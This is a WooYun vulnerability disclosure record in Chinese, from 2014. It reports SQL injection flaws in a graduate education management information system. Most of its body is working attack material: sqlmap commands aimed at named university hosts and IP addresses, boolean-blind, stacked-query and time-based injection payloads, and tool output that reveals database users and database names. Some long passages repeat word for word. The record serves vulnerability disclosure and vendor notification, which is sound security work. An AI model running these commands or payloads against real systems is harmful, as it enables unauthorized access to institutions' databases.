{"id": 55559, "wybug_id": "wooyun-2014-060561", "wybug_title": "某教育管理信息系统通用型多处SQL注入漏洞", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "Mr.leo", "wybug_date": "2014-05-15 15:06", "wybug_open_date": "2014-08-13 15:08", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-21：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-13：\t细节向公众公开  简要描述： 某教育管理信息系统通用型多处SQL注入漏洞 详细说明：  大连拓扑伟业科技有限公司 研究生教育管理信息系统，可查数据库表信息。 1、ID参数没有过滤，导致注射。3个案例Sqlmap -u \"http://grsmis.sjzu.edu.cn/public/tutorshow.aspx?ID=00147&spec=6\" --dbs --current-user --current-dbSqlmap -u \"http://202.118.83.94:85/public/tutorshow.aspx?ID=19851006&spec=59\" --dbs --current-user --current-dbSqlmap -u \"http://202.199.155.6/dlugdmis/public/tutorshow.aspx?ID=040040&spec=6\" --dbs --current-user --current-dbPlace: GETParameter: ID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ID=00147' AND 2469=2469 AND 'JOSw'='JOSw&spec=6---[17:06:03] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows Vistaweb application technology: ASP.NET, ASP.NET 2.0.50727, Microsoft IISback-end DBMS: Microsoft SQL Server 2005[17:06:03] [INFO] fetching current user[17:06:03] [INFO] resumed: gsadmincurrent user:    'gsadmin'[17:06:03] [INFO] fetching current database[17:06:03] [INFO] resumed: syjzgsDBcurrent database:    'syjzgsDB'[17:06:03] [INFO] fetching database names[17:06:03] [INFO] fetching number of databases[17:06:03] [INFO] resumed: 6[17:06:03] [INFO] resumed: master[17:06:03] [INFO] resumed: model[17:06:03] [INFO] resumed: msdb[17:06:03] [INFO] resumed: syjzgsDB[17:06:03] [INFO] resumed: temp[17:06:03] [INFO] resumed: tempdbavailable databases [6]:[*] master[*] model[*] msdb[*] syjzgsDB[*] temp[*] tempdb 实例2：sqlmap identified the following injection points with a total of 66 HTTP(s) requests:---Place: GETParameter: ID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ID=19851006' AND 1794=1794 AND 'jayi'='jayi&spec=59---sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: ID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ID=19851006' AND 1794=1794 AND 'jayi'='jayi&spec=59---current user:    'tpwy'current database:    'tpwymis20100628'available databases [18]:[*] dlmuTest100603[*] dmumis02[*] dmumis0719[*] dmumis20100511[*] dxHelp[*] HaTeam_Dd[*] masper[*] MisBak[*] model[*] msdb[*] newmar[*] ReportServer[*] ReportServerTempDB[*] tempdb[*] test[*] TPWY[*] tpwymis20100628[*] WYMIS实例3：Place: GETParameter: ID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ID=040040 AND 8570=8570&spec=6---[15:19:17] [INFO] testing MySQL[15:19:26] [WARNING] the back-end DBMS is not MySQL[15:19:26] [INFO] testing Oracle[15:19:35] [WARNING] the back-end DBMS is not Oracle[15:19:35] [INFO] testing PostgreSQL[15:19:44] [WARNING] the back-end DBMS is not PostgreSQL[15:19:44] [INFO] testing Microsoft SQL Server[15:19:54] [INFO] confirming Microsoft SQL Server[15:20:23] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005[15:20:23] [INFO] fetching current user[15:20:23] [WARNING] running in a single-thread mode. Please consider usage ofption '--threads' for faster data retrieval[15:20:23] [INFO] retrieved: gsmiscurrent user:    'gsmis'[15:26:56] [INFO] fetching current database[15:26:56] [INFO] retrieved: dlu100318current database:    'dlu100318'[15:37:58] [INFO] fetching database names[15:37:58] [INFO] fetching number of databases[15:37:58] [INFO] retrieved: 7[15:39:06] [INFO] retrieved: dlu100318[15:50:06] [INFO] retrieved: master[15:52:42] [INFO] retrieved: model[15:53:02] [INFO] retrieved: msdb[15:53:17] [INFO] retrieved: ReportServer[15:53:56] [INFO] retrieved: ReportServerTempDB[15:54:55] [INFO] retrieved: tempdbavailable databases [7]:[*] dlu100318[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] tempdb2、ID没有过滤，导致注射3个实例证明Sqlmap -u \"http://grsmis.sjzu.edu.cn/public/tutorshow.aspx?ID=00147&spec=6\" --dbs --current-user --current-dbSqlmap -u \"http://202.118.83.94:85/public/tutorshow.aspx?ID=19851006&spec=59\" --dbs --current-user --current-dbSqlmap -u \"http://202.199.155.6/dlugdmis/public/tutorshow.aspx?ID=040040&spec=6\" --dbs --current-user --current-dbPlace: GETParameter: ID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ID=00147' AND 2469=2469 AND 'JOSw'='JOSw&spec=6---[17:06:03] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows Vistaweb application technology: ASP.NET, ASP.NET 2.0.50727, Microsoft IISback-end DBMS: Microsoft SQL Server 2005[17:06:03] [INFO] fetching current user[17:06:03] [INFO] resumed: gsadmincurrent user:    'gsadmin'[17:06:03] [INFO] fetching current database[17:06:03] [INFO] resumed: syjzgsDBcurrent database:    'syjzgsDB'[17:06:03] [INFO] fetching database names[17:06:03] [INFO] fetching number of databases[17:06:03] [INFO] resumed: 6[17:06:03] [INFO] resumed: master[17:06:03] [INFO] resumed: model[17:06:03] [INFO] resumed: msdb[17:06:03] [INFO] resumed: syjzgsDB[17:06:03] [INFO] resumed: temp[17:06:03] [INFO] resumed: tempdbavailable databases [6]:[*] master[*] model[*] msdb[*] syjzgsDB[*] temp[*] tempdb 实例2：sqlmap identified the following injection points with a total of 66 HTTP(s) requests:---Place: GETParameter: ID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ID=19851006' AND 1794=1794 AND 'jayi'='jayi&spec=59---sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: ID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ID=19851006' AND 1794=1794 AND 'jayi'='jayi&spec=59---current user:    'tpwy'current database:    'tpwymis20100628'available databases [18]:[*] dlmuTest100603[*] dmumis02[*] dmumis0719[*] dmumis20100511[*] dxHelp[*] HaTeam_Dd[*] masper[*] MisBak[*] model[*] msdb[*] newmar[*] ReportServer[*] ReportServerTempDB[*] tempdb[*] test[*] TPWY[*] tpwymis20100628[*] WYMIS实例3：Place: GETParameter: ID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ID=040040 AND 8570=8570&spec=6---[15:19:17] [INFO] testing MySQL[15:19:26] [WARNING] the back-end DBMS is not MySQL[15:19:26] [INFO] testing Oracle[15:19:35] [WARNING] the back-end DBMS is not Oracle[15:19:35] [INFO] testing PostgreSQL[15:19:44] [WARNING] the back-end DBMS is not PostgreSQL[15:19:44] [INFO] testing Microsoft SQL Server[15:19:54] [INFO] confirming Microsoft SQL Server[15:20:23] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005[15:20:23] [INFO] fetching current user[15:20:23] [WARNING] running in a single-thread mode. Please consider usage ofption '--threads' for faster data retrieval[15:20:23] [INFO] retrieved: gsmiscurrent user:    'gsmis'[15:26:56] [INFO] fetching current database[15:26:56] [INFO] retrieved: dlu100318current database:    'dlu100318'[15:37:58] [INFO] fetching database names[15:37:58] [INFO] fetching number of databases[15:37:58] [INFO] retrieved: 7[15:39:06] [INFO] retrieved: dlu100318[15:50:06] [INFO] retrieved: master[15:52:42] [INFO] retrieved: model[15:53:02] [INFO] retrieved: msdb[15:53:17] [INFO] retrieved: ReportServer[15:53:56] [INFO] retrieved: ReportServerTempDB[15:54:55] [INFO] retrieved: tempdbavailable databases [7]:[*] dlu100318[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] tempdb3、id没有过滤，导致注射http://grsmis.sjzu.edu.cn/public/subjectspeci.aspx?id=71&gl=2http://202.118.83.94:85/public/subjectspeci.aspx?id=71&gl=2Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=71 AND 5561=5561&gl=2    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: id=71; WAITFOR DELAY '0:0:5';--&gl=2    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: id=71 WAITFOR DELAY '0:0:5'--&gl=2---[18:20:14] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows Vistaweb application technology: ASP.NET, ASP.NET 2.0.50727, Microsoft IIS 7.0back-end DBMS: Microsoft SQL Server 2005[18:20:14] [INFO] fetching current user[18:20:14] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[18:20:14] [INFO] retrieved:[18:20:15] [WARNING] reflective value(s) found and filtering outgsadmincurrent user:    'gsadmin'[18:20:46] [INFO] fetching current database[18:20:46] [INFO] retrieved: syjzgsDBcurrent database:    'syjzgsDB'[18:21:19] [INFO] fetching database names[18:21:19] [INFO] fetching number of databases[18:21:19] [INFO] retrieved: 6[18:21:22] [INFO] retrieved: master[18:21:50] [INFO] retrieved: model[18:22:12] [INFO] retrieved: msdb[18:22:35] [INFO] retrieved: syjzgsDB[18:23:19] [INFO] retrieved: temp[18:23:44] [INFO] retrieved: tempdbavailable databases [6]:[*] master[*] model[*] msdb[*] syjzgsDB[*] temp[*] tempdb 实例2：Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=71 AND 2894=2894&gl=2    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: id=71; WAITFOR DELAY '0:0:5';--&gl=2    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: id=71 WAITFOR DELAY '0:0:5'--&gl=2---[18:21:05] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005[18:21:05] [INFO] fetching current user[18:21:05] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[18:21:05] [INFO] retrieved:[18:21:06] [WARNING] reflective value(s) found and filtering outtpwycurrent user:    'tpwy'[18:21:20] [INFO] fetching current database[18:21:20] [INFO] retrieved: tpwymis20100628current database:    'tpwymis20100628'[18:22:07] [INFO] fetching database names[18:22:07] [INFO] fetching number of databases[18:22:07] [INFO] retrieved: 18[18:22:11] [INFO] retrieved: dlmuTest100603[18:23:02] [INFO] retrieved: dmumis02[18:23:33] [INFO] retrieved: dmumis0719[18:24:13] [INFO] retrieved: dmumis20100511[18:25:12] [INFO] retrieved: bxHelp[18:25:59] [INFO] retrieved: HaTeam_Dd[18:26:38] [INFO] retrieved: master[18:27:02] [INFO] retrieved: MisBak[18:27:26] [INFO] retrieved: model[18:27:47] [INFO] retrieved: msdb[18:28:04] [INFO] retrieved: newmar[18:28:29] [INFO] retrieved: ReportServer[18:29:15] [INFO] retrieved: ReportServerTempDB[18:30:23] [INFO] retrieved: tempdb[18:30:49] [INFO] retrieved: test[18:31:07] [INFO] retrieved: TPWY[18:31:25] [INFO] retrieved: tpwymis20100628[18:32:28] [INFO] retrieved: WYMISavailable databases [18]:[*] bxHelp[*] dlmuTest100603[*] dmumis02[*] dmumis0719[*] dmumis20100511[*] HaTeam_Dd[*] master[*] MisBak[*] model[*] msdb[*] newmar[*] ReportServer[*] ReportServerTempDB[*] tempdb[*] test[*] TPWY[*] tpwymis20100628[*] WYMIS   漏洞证明：  已经证明   修复方案：  过滤多个参数   版权声明：转载请注明来源 Mr.leo@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-05-18 15:59 厂商回复： CNVD确认并复现所述情况，由CNVD通过公开渠道联系软件生产厂商大连拓扑伟业科技有限公司处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}